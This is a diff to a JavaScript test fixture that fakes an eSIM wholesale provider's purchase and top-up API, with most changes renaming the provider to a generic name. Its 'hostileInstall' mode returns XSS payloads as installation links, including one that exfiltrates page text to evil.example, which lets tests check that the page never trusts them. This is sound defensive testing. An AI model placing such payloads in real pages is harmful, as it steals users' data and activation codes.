@@ -1,6 +1,6 @@
 'use strict';
 /**
- * fake-nadanada — a fake of nadanada.me that behaves the way the live API was observed to on
+ * fake-wholesale — a fake of provider.example that behaves the way the live API was observed to on
  * 15 Sep 2026:
  *   - POST /esim/purchase prices a catalogue bundle and answers a checkoutId, a payment hash and a
  *     bolt11 invoice.
@@ -11,10 +11,10 @@
  *     as /esim/purchase, plus an `iccid` echoing which profile it quoted. state.hostileInstall
  *     makes every installation detail a link that would run script if the page ever trusted it.
  *     state.refuseTopup makes
- *     this answer 400 instead — nadanada documents that not every bundle can join every profile —
+ *     this answer 400 instead — wholesale documents that not every bundle can join every profile —
  *     `true` refuses every top-up purchase, an ICCID string refuses only that profile's, and ''
  *     (the default) refuses none. state.wrongTopupIccid, when set, echoes that ICCID instead of the
- *     one actually asked for — a nadanada bug (or a test of the guard against paying for it).
+ *     one actually asked for — a wholesale bug (or a test of the guard against paying for it).
  *   - POST /esim/{iccid}/complete is the same 402/404 as /esim/complete, plus 403 when the payment
  *     hash names a checkout for a different ICCID, and 200 with only { iccid, bundleName, toppedUp }
  *     — no installationDetails, because the profile is already on the phone.
@@ -24,14 +24,14 @@
  * through the Lightning network, which is why start() takes the mock payer rather than keeping
  * its own notion of "paid".
  *
- * Shared by test/nadanada.test.js (the provider's own logic, driven against the fake directly),
- * test/redeem-nadanada.test.js (the redeem endpoint through the provider, against the same fake)
+ * Shared by test/wholesale.test.js (the provider's own logic, driven against the fake directly),
+ * test/redeem-wholesale.test.js (the redeem endpoint through the provider, against the same fake)
  * and test/sim.test.js (one eSIM per wallet, topped up, per place), so there is exactly one fake
- * nadanada to keep faithful to the real one.
+ * wholesale to keep faithful to the real one.
  *
- *   const fakeNadanada = require('./support/fake-nadanada');
- *   const fake = await fakeNadanada.start({ mockPayer });
- *   process.env.NADANADA_BASE_URL = fake.base;
+ *   const fakeWholesale = require('./support/fake-wholesale');
+ *   const fake = await fakeWholesale.start({ mockPayer });
+ *   process.env.WHOLESALE_BASE_URL = fake.base;
  *   // fake.state: { checkouts, seq, tamper, settleAfterCalls, expirySeconds, refuseTopup,
  *   //               wrongTopupIccid, log } — the same knobs a test pokes directly to change what
  *   //               the fake does next.
@@ -109,10 +109,10 @@ function start({ mockPayer, catalogue = CATALOGUE } = {}) {
     return { status: 200, body: { success: true, data: {
       iccid: co.iccid, bundleName: co.bundleName, orderReference: 'ORD-' + co.checkoutId.slice(0, 8),
       installationDetails: {
-        // state.hostileInstall stands in for a nadanada that has been compromised, or whose own
+        // state.hostileInstall stands in for a wholesale that has been compromised, or whose own
         // upstream injected a link: everything here is a string we did not write, rendered on the
         // page that is showing the holder's activation code.
-        qrCode: state.hostileInstall ? 'javascript:fetch("//evil.example/"+document.body.innerText)' : 'https://nadanada.me/qr/' + co.iccid + '.png',
+        qrCode: state.hostileInstall ? 'javascript:fetch("//evil.example/"+document.body.innerText)' : 'https://provider.example/qr/' + co.iccid + '.png',
         manualCode: ac, smdpAddress: 'rsp.example.com', matchingId: co.iccid.slice(-6),
         appleInstallUrl: state.hostileInstall ? 'javascript:alert(document.domain)' : 'https://esimsetup.apple.com/esim_qrcode_provisioning?carddata=' + encodeURIComponent(ac),
         androidInstallUrl: state.hostileInstall ? 'data:text/html,<script>alert(1)</script>' : 'https://esim.example/android?lpa=' + encodeURIComponent(ac),
